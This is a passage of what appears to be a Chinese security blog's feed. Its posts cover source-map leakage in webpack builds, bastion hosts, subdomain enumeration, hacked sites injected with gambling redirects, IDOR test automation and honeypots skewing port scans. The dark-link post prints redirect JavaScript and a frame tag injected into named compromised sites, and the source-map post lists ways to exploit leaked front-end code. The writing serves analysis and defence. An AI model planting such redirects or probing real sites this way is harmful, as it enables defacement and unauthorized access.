<p>使用UglifyJS2对源代码进行压缩变换:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uglifyjs hello.js \</span><br><span class="line">         -m toplevel=<span class="literal">true</span> \</span><br><span class="line">         -c unused=<span class="literal">true</span>,collapse_vars=<span class="literal">true</span> \</span><br><span class="line">         -o hello.min.js</span><br></pre></td></tr></table></figure>
<p>压缩后的代码<strong>hello.min.js</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">o</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> o=<span class="string">&quot;Hello, &quot;</span>+<span class="title class_">Name</span>;<span class="variable language_">console</span>.<span class="title function_">log</span>(o)&#125;<span class="title function_">o</span>();</span><br></pre></td></tr></table></figure>
<h2 id="为啥需要Source-Map">为啥需要Source Map?</h2>
<p>使用Firefox执行<strong>hello.js</strong>的报错信息是这样:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ReferenceError: Name is not defined</span><br><span class="line">	sayHello file:///Users/fundebug/sourcemap-tutorial/hello.js:4:9</span><br><span class="line">	&lt;匿名&gt; file:///Users/fundebug/sourcemap-tutorial/hello.js:8:1</span><br></pre></td></tr></table></figure>
<p>而<strong>hello.min.js</strong>的报错信息是这样:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ReferenceError: Name is not defined</span><br><span class="line">	o file:///Users/fundebug/sourcemap-tutorial/hello.min.js:1:18</span><br><span class="line">	&lt;匿名&gt; file:///Users/fundebug/sourcemap-tutorial/hello.min.js:1:59</span><br></pre></td></tr></table></figure>
<p>对比压缩前后的出错信息，我们会发现，错误行号和列号已经失真，且函数名也经过了变换。而对于真实的前端项目，开发者会将数十个源文件压缩为一个文件，这时，错误的列号可能多达数千，且出错的真实文件名也是很难确定的，这样的话，压缩代码的报错信息是很难Debug的。</p>
<p>而Source Map则可以用于还原真实的出错位置，帮助开发者更快的Debug。</p>
<hr />
<p>webpack 是一个现代 JavaScript 应用程序的静态模块打包器(module bundler)。</p>
<p>source-map文件，这个文件是编译过程中变量与方法的映射表。</p>
<hr />
<h1>VUE/REACT开发场景</h1>
<p>在VUE/REACT开发场景下 ，前端开发会引入如模块化等诸多新特性，前端开发不再是几个简单的js文件，开发完成后会通过webpack等打包工具打包生成部署使用的js文件，但是如果我们直接分析该编译的js，很难看懂。</p>
<p>比如某页面下的app.bundle.js,反正我是看不懂写的是啥，这个js文件就是webpack打包后的结果，但是由于我是开启了source-map调试模式，如果你是用chrome浏览器打开的，打开devtools-sources，应该可以看到一个<code>webpack://</code>，这个就是chrome对source-map调试的支持，点开src目录下就可以看到js代码源文件。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200414115217.png" alt="20200414115217" /></p>
<h2 id="为什么会有这类问题">为什么会有这类问题?</h2>
<p>大多数开发人员没有意识到的是，这些源映射<code>source-map</code>实际上包含了其前端源代码的全部。</p>
<p>是的，他们知道可以进行映射，但是源映射后的文件几乎为乱码，更不用说理解了。由于这种误解，发现开发团队在其Webpack配置中将JavaScript源映射留在生产环境中是相对常见的。</p>
<hr />
<h2 id="解决方案-2">解决方案:</h2>
<p>修改<code>config/index.js</code>中的<code>build</code>对象<code>productionSourceMap: false</code>即可</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200418144413.png" alt="20200418144413" /></p>
<hr />
<h1>渗透思路or危害:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>通过<code>source-map</code>可以获取前端源码,也就是说从黑盒变成了灰盒。</p>
</li>
<li class="lvl-2">
<p>泄露的各种信息如网站路径、API、加密算法、管理员邮箱、内部功能等等。</p>
</li>
<li class="lvl-2">
<p>很多vue应用都是先渲染页面再判断是否登陆，根据这个小缺陷，我们首先可以查看相关功能</p>
</li>
<li class="lvl-2">
<p>前端源码被人copy走</p>
</li>
</ul>
<hr />
<h1>工具:</h1>
<p><a href="https://github.com/rarecoil/unwebpack-sourcemap">unwebpack-sourcemap</a></p>
<p>通过查看浏览器中包含的JavaScript文件并提取捆绑的JavaScript文件底部存在的sourceMappingURL来获取源地图。</p>
<p>原理:</p>
<p>在页面正则匹配 <code>regex = &quot;\\/\\/#\s*sourceMappingURL=(.*)$&quot;</code></p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.secpulse.com/archives/96416.html">webpack带来的安全风险</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/fundebug/p/source_map_tutorial.html">Source Map入门教程</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.freebuf.com/articles/web/193230.html">前端打包编译时代来临对漏洞挖掘的影响</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/cuixiping/article/details/8592823">压缩版JS的调试利器JavaScript Source Map基本介绍</a></p>
</li>
<li class="lvl-2">
<p><a href="https://zhuanlan.zhihu.com/p/26033573">谈谈我是如何获得知乎的前端源码的</a></p>
</li>
<li class="lvl-2">
<p><a href="https://medium.com/@rarecoil/spa-source-code-recovery-by-un-webpacking-source-maps-ef830fc2351d">SPA source code recovery by un-Webpacking source maps</a></p>
</li>
<li class="lvl-2">
<p><a href="https://wangdaodao.com/20190724/webpack-sources-vue.html">Webpack打包后禁止Sources查看VUE源码</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>堡垒机的一些知识</title>
    <url>/2020/9254.html</url>
    <content><![CDATA[<h1>堡垒机的起源:</h1>
<p>2000年前后，随着全球信息技术的不断发展和信息化建设的不断进步，电信、财政、税务、公安、金融、电力、石油等重要行业的大型机构和企业内网中，开始使用数量较多的服务器主机来运行关键业务，并逐步把服务器主机集中到机房中统一管理。</p>
<p><strong>随着服务器的大集中和IT系统的日趋复杂，系统管理员、系统运维人员、系统应用高权限用户、第三方厂商的维护人员以及其他临时高权限人员等不同背景的运维人员开始给企业信息系统安全运行带来较大的潜在风险。</strong></p>
<p>同时，随着萨班斯法案等合规性法律要求开始生效，企业的经营活动，企业管理、项目和投资等，都要有控制和审计手段。</p>
<p><strong>管理人员需要有有效的技术手段和专业产品来控制、限制和追踪用户的行为，判定用户的行为是否对企业内部网络的安全运行带来威胁。</strong></p>
<p>因此，运维堡垒机应运而生。</p>
<hr />
<h1>堡垒机的发展:</h1>
<h2 id="第一代堡垒机">第一代堡垒机</h2>
<p>跳板机可被称为第一代堡垒机。</p>
<p>2000年左右，高端行业用户为了对运维人员的远程登录进行集中管理，会在机房里部署跳板机。跳板机就是一台服务器，维护人员在维护过程中，首先要统一登录到这台服务器上，然后从这台服务器再登录到目标设备进行维护。</p>
<p><strong>但跳板机并没有实现对运维人员操作行为的控制和审计，使用跳板机过程中还是会有误操作、违规操作导致的操作事故，一旦出现操作事故很难快速定位原因和责任人。</strong></p>
<h2 id="第二代堡垒机">第二代堡垒机</h2>
<p>由于跳板机存在的各类问题，出现了改进后的第二代堡垒机。</p>
<p>第二代堡垒机被部署在外部网络和企业内部网络之间，提供对内部网络特定资源的安全访问，主要采用SSL ×××方式工作。</p>
<p>对内部网络特定资源的访问则必须先登录到堡垒机上方可完成。主要满足用户对最常用的运维协议的功能性需求，支持对文本类（如Telnet，SSH）和图形类（如RDP）等运维协议的审计。</p>
<h2 id="第三代堡垒机">第三代堡垒机</h2>
<p>随着运维审计需求的增多，用户对堡垒机支持的协议种类需求越来越多，第二代堡垒机在响应这些需求方面显得力不从心，因此，出现了采用协议代理的方式的第三代堡垒机，它切断了终端计算机对网络和服务器资源的直接访问，接管了终端计算机对网络和服务器的访问。</p>
<p>第三代堡垒机综合了更多的用户应用需求，其支持的协议相应增加了如数据库协议、web应用协议等。目前市面上销售的堡垒机大多属于第三代堡垒机。</p>
<h2 id="堡垒机的问题">堡垒机的问题:</h2>
<p>部分运维堡垒机厂商的产品普遍存在以下问题:</p>
<ol>
<li class="lvl-3">
<p>**运维堡垒机成为了新的系统脆弱点。**由于运维堡垒机是连接前后端的唯一途径，首当其冲成为了被hack的重要目标，风险加大。因此应该尽量减少系统加载的服务或模块，从而尽可能减少可被hack的风险。</p>
</li>
</ol>
<blockquote>
<p>两步验证:动态口令</p>
</blockquote>
<ol start="2">
<li class="lvl-3">
<p>部署困难，管理繁琐，用户操作体验不佳。特别是在管理设备种类较多、设备数量规模较大的情况下，存在配置界面复杂，操作方式不连贯，部署费工费时等问题。</p>
</li>
</ol>
<hr />
<h1>信息系统运维中的问题:</h1>
<h2 id="1、一个用户使用多个账号">1、一个用户使用多个账号</h2>
<p>由于信息系统庞大，拥有少则数十台，多则上百台的服务器，而维护人员又极其有限，单个工程师维护多套系统的现象普遍存在。伴随而来就是工程师记事簿上密密麻麻的账号密码，同时在多套主机系统之间切换，其工作量和复杂度成倍增加，直接导致的后果就是工作效率低下，操作繁琐容易出现误操作，影响系统正常运行。</p>
<blockquote>
<p>操作繁琐麻烦</p>
</blockquote>
<h2 id="2、权限分配粗放，缺乏细粒度">2、权限分配粗放，缺乏细粒度</h2>
<p>大多数的系统授权是采用操作系统自身的授权系统，授权功能分散在各个设备和系统中，缺乏统一的运维操作授权策略，授权颗粒度粗，无法基于最小权限分配原则管理用户权限，因此，出现运维人员权限过大和内部操作权限滥用等问题。</p>
<h2 id="3、第三方代维人员的操作行为缺乏有效监控">3、第三方代维人员的操作行为缺乏有效监控</h2>
<p>随着企业信息化建设的快速发展，为缓解企业IT人员不足的压力，越来越多的企业系统运维工作转交给系统供应商或第三方代维商，企业既解决了人员不足的问题，又解决了招聘新人的技能培训问题。但是在享受便利的同时，由于涉及提供商，代维商过多，人员复杂流动性又大，对操作行为缺少监控带来的风险日益凸现，因此，需要通过严格的权限控制和操作行为审计。</p>
<p>针对上述问题，相信广大运维工程师都有“搔头不知痒处”的苦恼。不用急，这个时候我们的堡垒机登场了。</p>
<hr />
<h1>堡垒机的审计过程</h1>
<p>堡垒机又名运维安全审计系统，<strong>首先他将服务器群的访问限定单一入口，所有用户均不能直接访问服务器，需通过堡垒机中转，这样就有条件对整个流量进行监控，对风险操作进行记录报警，对用户进行集中地细粒度权限管理。</strong></p>
<p>再在堡垒机中集成单点登录(SSO)功能，用户只需登录一次就可以访问所有相互信任的应用系统解决单用户多账号问题;再就协议代理，通过截获HTTP、ftp、ssh、rdp、vnc通信协议内容，解析并记录IT运维人员的操作过程。</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.freebuf.com/news/153326.html">细说堡垒机与数据库审计</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.51cto.com/14116240/2340253">运维堡垒机的起源、发展和未来趋势</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>子域名搜集</title>
    <url>/2019/860.html</url>
    <content><![CDATA[<h1>为什么要搜集子域名?</h1>
<p><img src="https://i.loli.net/2019/04/25/5cc1d743199d5.jpg" alt="" /></p>
<p>这些子域名都是与<strong>企业的资产</strong>相关联的.发现更多的子域名,意味着发现了更多的企业资产.</p>
<h2 id="攻击者的角度">攻击者的角度:</h2>
<p>对于攻击者来说,意义在于可以发现更多的攻击点,增大攻击面<code>attack face</code>,接着选取一个最脆弱的目标进行攻击.</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d7443e383.jpg" alt="" /></p>
<p>在《Metasploit渗透测试指南》里面有提到,真正的攻击者是不会造成很多噪声的,意味着他会选择一条代价最小、收益最高的攻击路径,来获取他目标系统的高权限.</p>
<p>为此他需要先找到一个最脆弱的目标.也就是找到企业资产中最脆弱的一部分来进行攻击.</p>
<p>而通过对子域名进行搜集,便是发现脆弱资产当中必要的一步.</p>
<h2 id="防御者的角度">防御者的角度:</h2>
<p>对于防御者来说,意义在于能够对资产进行更好的管理.</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d74575511.jpg" alt="" /></p>
<p>企业大部分做的安全工作都是围绕企业的资产来进行的。</p>
<p>可现状是,由于企业大、业务线多、管理难等问题,很多时候企业会匆忙上线一个新的应用或服务,这样就会造成出现很多“在野资产”.</p>
<p>这种“在野资产”往往是等到出现安全事件后,去追责才会被发现。</p>
<p>这种时候,如果能够提前对新增、新上线的资产进行发现的话，就能更好的保障企业的资产安全.</p>
<p>而通过对子域名进行搜集,便是发现“在野资产”当中必要的一步.</p>
<hr />
<h1>搜集途径:</h1>
<h2 id="外部搜集途径">外部搜集途径:</h2>
<p>在外部,可以通过很多方式进行搜集,这张思维导图列出来的已经比较详细了。</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g09uim238mj30u00z7npd.jpg" alt="" /></p>
<p>其他接口:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="http://ce.baidu.com/index/getRelatedSites?site_address=bgy.com.cn">百度云观测接口</a></p>
</li>
</ul>
<h2 id="内部搜集途径">内部搜集途径:</h2>
<p>除了通过互联网,在外部进行必要的搜集以外,也是需要内部对子域名进行搜集来进行补充的.</p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/zdresearch/OWASP-Nettacker/blob/85cbaab94415c8f994250d2f3d2ddb8394853f4d/lib/scan/subdomain/engine.py">OWASP-Nettacker</a></p>
</li>
<li class="lvl-2">
<p><a href="https://speakerdeck.com/yamakira/esoteric-sub-domain-enumeration-techniques?slide=8">esoteric-sub-domain-enumeration-techniques</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/bit4woo/teemo">teemo</a></p>
</li>
<li class="lvl-2">
<p>《Metasploit渗透测试指南》</p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>暗链案例初探</title>
    <url>/2019/23101.html</url>
    <content><![CDATA[<h1>主页被黑被篡改:</h1>
<h2 id="案例1">案例1:</h2>
<p><code>https://www.and-the-like.com/</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdc41fb5354335400.png" alt="" /></p>
<p>无法关键词识别,只有图片</p>
<hr />
<h2 id="案例2">案例2:</h2>
<p><code>https://www.daobangedu.com/</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdc42c6e127e17972.png" alt="" /></p>
<p>有关键词:时时彩等</p>
<hr />
<h2 id="案例3">案例3:</h2>
<p><code>www.lexuedidai.com</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdc4339e253695045.png" alt="" /></p>
<p>有图片也有关键字关键词:彩票 赌博 投注</p>
<p>随便访问里面的js的网站,有个<code>phpinfo</code>呀.<br />
<code>http://275195.com/index.php</code><br />
<img src="https://i.loli.net/2019/05/16/5cdc440978f9b52950.png" alt="" /></p>
<hr />
<h3 id="案例4">案例4:</h3>
<p><code>http://www.fslp1.com/</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdc44b187d5914134.png" alt="" /></p>
<p>关键词:彩票,娱乐平台,时时彩</p>
<hr />
<h1>跳转:</h1>
<h2 id="案例1-2">案例1:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var n = Math.floor(Math.random()*3);</span><br><span class="line">if(n==0)&#123;</span><br><span class="line">document.writeln(&#x27;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;0; url=https://www.68599.com/&quot; /&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(n==1)&#123;</span><br><span class="line">document.writeln(&#x27;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;0; url=https://www.68499.com/&quot; /&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if(n==2)&#123;</span><br><span class="line">document.writeln(&#x27;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;0; url=https://www.131313.com/&quot; /&gt;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>js的<code>document.writeln</code>重新刷新页面</p>
<p><img src="https://i.loli.net/2019/05/16/5cdc38bec7e5451537.png" alt="" /></p>
<hr />
<h2 id="案例2-2">案例2:</h2>
<p>url:<code>http://www.wuzuilaojiao.com/</code></p>
<p>要挂代理才能访问到博彩页面,页面源码没有关键词,只有图片.</p>
<p><img src="https://i.loli.net/2019/05/16/5cdc3bcc48eb112943.png" alt="" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;frame name=&quot;main&quot; src=&quot;http://mark.zc.qp891.com&quot; scrolling=&quot;yes&quot;&gt;</span><br></pre></td></tr></table></figure>
<p><code>&lt;frame src=&quot;/example/html/frame_b.html&quot;&gt;</code>既是表示当前的框架里面显示src后面这个路径的html页</p>
<p><img src="https://i.loli.net/2019/05/16/5cdc3f048811515654.png" alt="" /></p>
<hr />
<h2 id="案例3-2">案例3:</h2>
<p>url: <code>www.gzbihua.com</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdc471b7c45e43997.png" alt="" /></p>
<p><code>https://www.gzbihua.com/template/pc/skin/js/jquery.tz.js</code></p>
<p>这个js应该只是打乱了,没有混淆.</p>
<p><img src="https://i.loli.net/2019/05/16/5cdc476987bd781253.png" alt="" /></p>
<hr />
<h2 id="案例4-2">案例4:</h2>
<p>初始url:<code>http://www.aohougz.com/</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdd75977a49848288.png" alt="" /></p>
<p>第一次跳转到:<code>https://www.mtc39.com/?att=996</code><br />
再跳转到:<code>http://www.13145.com/</code></p>
<p><img src="https://i.loli.net/2019/05/16/5cdd75f55e34e10877.png" alt="" /></p>
<p>最终页面没有敏感词.只有个图片里有文字:彩票</p>
<blockquote>
<p>如果在最终页面,再通过敏感字判断也不行.<br />
初始url的源码里是有关键字的<code>彩票 , 投注</code>那么判断思路,应该是在每个页面都要进行判断.</p>
</blockquote>
<hr />
<h1>总结:</h1>
<p>js的<code>document.writeln</code><br />
frame标签的src</p>
<hr />
<h1>敏感字词库:</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">足球</span><br><span class="line">外围</span><br><span class="line">好彩</span><br></pre></td></tr></table></figure>
<blockquote>
<p>待补充</p>
</blockquote>
<hr />
<h1>想法:</h1>
<p>网上固然有很多别人的文章,但是不如自己切实的去访问,记录一下.<br />
毕竟别人的东西,只是看了,最终也不能转化吸收成你的.</p>
]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈越权自动化</title>
    <url>/2020/26609.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>自己拍脑袋写了个idor_auto脚本去扫描越权漏洞。发现效果还可以。</p>
<p>上网查下资料整理下思路。</p>
<hr />
<h1>越权漏洞</h1>
<h2 id="简介-5">简介:</h2>
<p>定义: 增、删、改、查，缺乏权限鉴定或者鉴定不严</p>
<h2 id="分类">分类:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>未授权访问</p>
</li>
<li class="lvl-2">
<p>水平越权</p>
</li>
<li class="lvl-2">
<p>垂直越权</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406154039.png" alt="20200406154039" /></p>
<hr />
<h2 id="案例">案例:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406154235.png" alt="20200406154235" /></p>
<hr />
<h2 id="越权漏洞的痛点">越权漏洞的痛点:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406154303.png" alt="20200406154303" /></p>
<hr />
<h1>工具的设计思路:</h1>
<h2 id="第一版">第一版:</h2>
<p><a href="https://jerrychan807.github.io/2019/12/29/%E8%B6%8A%E6%9D%83%E5%8D%8A%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8F%92%E4%BB%B6%E7%9A%84%E5%B0%9D%E8%AF%95/">越权半自动化插件的尝试</a></p>
<p>缺点在于要自己先找到某个包的某个参数是存在越权漏洞的,不够自动化。</p>
<hr />
<h2 id="第二版">第二版:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406165919.png" alt="20200406165919" /></p>
<p>输出的结果:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406173351.png" alt="20200406173351" /></p>
<p>相对第一版来说,更通用。自动化程度更高</p>
<p>缺点:需要2个账户在登录下，尽可能多的点击相同的功能点,触发请求，效率有点低。</p>
<p>存在误报的情况:</p>
<p>比如公共接口:</p>
<p>用两个账户的token去请求链接可以得到同样的响应结果,但是该页面本身没有数据操作的功能。</p>
<p>可以理解为这类结果为公共接口，例如 获取地区省市县的接口，获取最新更新包的下载地址接口。</p>
<p>不管用谁的token获取的结果都是一样的。</p>
<hr />
<h1>参考别人的思路:</h1>
<h2 id="ele">ele:</h2>
<h3 id="思路设计1-Request重放">思路设计1:Request重放</h3>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406155039.png" alt="20200406155039" /></p>
<p>缺乏鉴权的部分,图中的用法是单纯替换token,而我的工具的做法是,替换整个请求body。</p>
<p>单纯替换token的粒度更低,相比我的方案可以发现更多:在url上的越权,一些头部字段的越权，这感觉效果更好。</p>
<p>而且,可以只需要用单一用户点击功能，触发请求就可以了。相比我的方案(两个账户触发请求)来说，效率更高。</p>
<p>修改ID的部分,感觉不能单纯的对数字加一减一,效果不好，比如说订单号order_id,加一减一之后不一定是真实存在的订单号。</p>
<p>过滤部分，过滤掉本身无需鉴权的请求,这一点可以大大减少误报。</p>
<hr />
<h3 id="思路设计2-Response比对">思路设计2:Response比对</h3>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406175758.png" alt="20200406175758" /></p>
<p>比较body的内容是否完全一样,这样会漏报。因为有些response里面含有一些随机值。</p>
<p>比较body length的话,可能会误报,但是总比漏报好。</p>
<p>比较好的比对方案是: status code + body length</p>
<hr />
<h2 id="中通scr">中通scr:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200406182126.png" alt="20200406182126" /></p>
<p>开发了浏览器插件供QA人员使用,触发请求部分不需要由安全的同事来做,这一点很赞。</p>
<blockquote>
<p>首先我们来看，越权漏洞的本质是服务方没有正确地进行鉴权，如果能够准确无误地执行了鉴权的动作，那就不会存在越权漏洞。这里有一个前提就是合理的权限设定，判断是否正确地执行了鉴权，其实就是判断真实的响应结果是否和规划的权限设定里测试用例的预期结果是否一致，如果一致那就不存在越权漏洞，反之则存在，以上是整个方案的基础原理。</p>
</blockquote>
<blockquote>
<p>其次在工程上如何实现呢？要获取真实的响应结果和规划的权限设定，需要六个实体的参与：<strong>安全测试人员、检测应用、部署检测应用的设备、统一认证中心、统一权限中心、统一资源中心</strong>，关键点在于自动化地安全认证（安全测试人员登录检测应用的身份认证和检测应用作为独立身份与其它实体的应用间的认证）<strong>、自动化地获取被测系统包含的所有权限列表并授权（检测应用从统一权限中心拉取后以安全测试人员的身份请求权限中心进行逐一授权）</strong>、自动化地获取被测系统的所有对外服务及对应的包含预期结果的测试用例（服务及测试用例作为资源被自动化地解析到统一资源中心，检测应用从统一资源中心自动拉取），检测应用在通过相关认证和授权后可以自动化地按照拉取的服务列表执行对应的测试用例并进行判断，然后自动化地取消上一个授权获取下一个授权直到结束。</p>
</blockquote>
<blockquote>
<p>由于自动化授权的敏感性，可以由检测应用和部署检测应用的设备结合成网络代理并且由安全测试人员提供TOTP满足信任要求，另外测试用例要做到生产环境的无害性，这样也可以直接部署到生产环境进行定期自动化测试。接下来对部分细节作简要阐述，在传统开发模式中，系统规划的权限设定通常存在开发人员的大脑和服务的鉴权代码中，这样非常不利于上线前权限设计的合理性和正确性的评审以及上线后鉴权逻辑实现正确性的核查，也是越权漏洞频发的根因，我们需要在服务开发之初就文档化下来，包括服务的定义、安全测试用例及预期的结果，在开发实现方面，我们可以借助流行的IDL接口描述语言的一些特性，如protobuf的descriptor或option，IDL用来定义服务，其中的一些特性用来定义安全测试用例及预期的结果，结合起来可以支持非常复杂的场景，服务方面既可以提供RPC也可以提供RESTful形式，意味着既可以支持中台对外服务也可以支持对内的微服务（对内的微服务作为独立的身份实体），安全测试用例方面既可以支持行为、菜单等权限，也可以支持数据权限，整个的定义如proto文件需要自动化地解析到资源中心并且和应用标识关联起来。另外在统一权限中心的设计方面，我们需要将应用所有的权限集中配置和使用，并且做到配置项和服务的关联，这样可以实现任意权限模型的支持，如RBAC、ABAC等。</p>
</blockquote>
<p>这个零信任安全架构下的全新思路有点东西。。。</p>
<hr />
<h1>构思:另一种更好的方案:</h1>
<p>半自动化的原因是因为触发请求的部分最好是由人来触发。这样能保证请求的真实、多和全。</p>
<p>甲方的话可以通过查询api的日志来做到这一点。</p>
<p>api日志里面的请求是完整的,真实的，是由用户触发的。</p>
<p>比如查询最近10分钟的api日志,就可以拿到多个用户的有效的真实请求。</p>
<p>然后进行测试，首先这样就做到了在收集数据包方面的自动化，不需要再一个个的去点了。</p>
<p>但是这样的话，有个需要考虑的点：如果是在生产环境，很容易出现给其他用户写入脏数据</p>
<p>怎么样保证无害化？又是一个值得考虑的点。比如用生产环境的日志(生产环境的日志可能又不够全)。</p>
<hr />
<h1>其他问题:</h1>
<h2 id="增删改查">增删改查</h2>
<p>查是最容易实现的，那么增删改呢？</p>
<h2 id="没有数据">没有数据</h2>
<p>有些接口,如果你的2个测试账户都是没有数据的话，往往测试账号都是没有什么信息的。</p>
<p>那么不管怎么测，他们的结果都是空的，没有什么意义的数据。</p>
<p>这个时候在实际的渗透测试中,比如phone参数,你会用特制的手机号列表去遍历，直到一个length特别不同的包出现，这个时候才能真正的证明这个接口是有越权的。</p>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="http://www.doc88.com/p-3939514860099.html">一种Web应用越权漏洞自动化检测实现</a></p>
</li>
<li class="lvl-2">
<p><a href="https://wenku.baidu.com/view/f9cb775ccdbff121dd36a32d7375a417866fc1b7.html">越权半自动化检测实践</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.secrss.com/articles/7531">中通分布式被动安全扫描实践</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.secrss.com/articles/13426">中通安全开源项目之越权漏洞自动化检测</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>端口扫描-遇到防护设备的情况</title>
    <url>/2019/62552.html</url>
    <content><![CDATA[<h1>前言:</h1>
<p>在做主机资产扫描-识别端口开放情况与服务的时候,一开始很容易遇到的问题就是:<strong>识别端口数量过少</strong>,</p>
<p>就是有些端口明明开放了,你却识别不出来.</p>
<p>要解决这个问题,可以考虑以下思路:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>修改<code>nmap</code>参数,<strong>跳过存活主机的发现</strong></p>
</li>
<li class="lvl-2">
<p>有可能是发包数过快,网络设备处理不过来,存在<strong>丢包</strong>的情况</p>
</li>
</ul>
<h1>新的问题:</h1>
<p>解决完<strong>识别端口数量过少</strong>的问题后,后来又出现了另一个问题:<strong>识别端口数量过多</strong></p>
<p>例子1:</p>
<p><img src="https://i.loli.net/2019/04/26/5cc2e35e8f5d9.jpg" alt="" /></p>
<p>例子2:</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g19n1px5zhj31co0ruk9j.jpg" alt="" /></p>
<p>图中显示的端口都是开放状态.</p>
<p>refs:DC0531技术沙龙-国内SRC漏洞挖掘经验和技巧分享</p>
<hr />
<h1>原因:</h1>
<p>目标主机可能有防护设备如<strong>蜜罐</strong>等.</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g19nopfda1j30a60a4goh.jpg" alt="" /></p>
<hr />
<h2 id="什么是蜜罐">什么是蜜罐</h2>
<blockquote>
<p>通常将**蜜罐(honeypot)**定义为一种安全资源.</p>
<p><strong>它不需要提供实际的应用，蜜罐的存在价值就是诱导和记录攻击行为</strong>，从而了解攻击者的入侵方法和手段，并能够延缓其攻击进程</p>
<p>进而根据捕获的攻击行为数据，分析攻击者使用的攻击方法和工具，从而让防御方针对性地增强系统的安全防护能力。</p>
</blockquote>
<p><strong>有点草船借箭的意味.</strong></p>
<hr />
<h2 id="蜜罐的分类">蜜罐的分类</h2>
<p><strong>蜜罐的交互程度通常取决于蜜罐对相应服务的模拟程度。</strong></p>
<p>（1）低交互蜜罐该类蜜罐通常只提供少量的交互功能，<strong>蜜罐在特定端口监听连接并记录数据包，可以用来实现端口扫描和暴力破解的检测</strong>。低交互蜜罐结构简单，易于安装部署，由于模拟程度低功能较少，收集信息有限但风险也较低。</p>
<p>（2）高交互蜜罐高交互蜜罐通常基于真实的应用环境来构建，能提供真实的服务。高交互蜜罐可用来获取大量的信息，能够捕获攻击者多种操作行为，从而具备发现新的攻击方式和漏洞利用方法的能力。由于高交互蜜罐给攻击者提供了一个相对真实的应用环境，因此风险较大，通常会注重数据控制方面的功能。</p>
<hr />
<h2 id="简单总结">简单总结:</h2>
<p>黑客入侵或做安全检测的时候,往往要先做信息搜集.</p>
<p>第一步便是要看看目标主机开放了什么端口,以及端口上对应的服务.(攻击面 attack face)</p>
<p>而简单的,部署上一个<strong>低交互蜜罐</strong>,就可以增大攻击者(检测者)的难度.cool~</p>
<hr />
<h1>对检测者的影响:</h1>
<h2 id="卡死检测者">卡死检测者:</h2>
<p>一般检测的时候,我们都会对<strong>整个网段进行全端口扫描</strong>.</p>
<p>如果这个网段内某一两台主机部署了蜜罐的话,那么这整个检测任务会处于几乎卡死的状态.</p>
